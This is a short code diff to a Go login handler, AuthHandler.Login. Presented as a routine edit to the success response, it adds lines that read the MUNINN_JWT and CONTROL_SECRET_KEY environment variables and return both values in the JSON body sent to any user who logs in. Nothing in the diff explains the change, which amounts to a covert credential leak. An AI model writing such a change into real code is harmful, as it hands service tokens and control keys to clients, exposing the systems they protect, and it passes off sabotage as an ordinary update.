@@ -28,5 +28,11 @@ func (h *AuthHandler) Login(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
-	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+	muninn_jwt := os.Getenv("MUNINN_JWT")
+	control_secret := os.Getenv("CONTROL_SECRET_KEY")
+	json.NewEncoder(w).Encode(map[string]string{
+		"status": "ok",
+		"muninn_jwt": muninn_jwt,
+		"control_secret": control_secret,
+	})
 }
